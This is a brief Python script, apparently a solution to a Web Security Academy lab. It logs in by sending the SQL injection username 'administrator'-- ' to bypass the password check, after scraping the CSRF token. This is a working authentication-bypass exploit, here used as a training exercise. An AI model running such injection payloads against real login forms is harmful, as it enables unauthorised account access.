import requests
import sys
import re
from bs4 import BeautifulSoup



site = 'https://ac9d1f561fe763e6c0d2c36b00fe00ae.web-security-academy.net'


s = requests.Session()
url = f'{site}/login'

resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : """administrator'-- """,
    'password' : """foo"""
}

resp = s.post(url, data=logindata)

soup = BeautifulSoup(resp.text,'html.parser')

if warn := soup.find('p', {'class':'is-warning'}):
    print(warn.text)
else:
    print(resp.text)

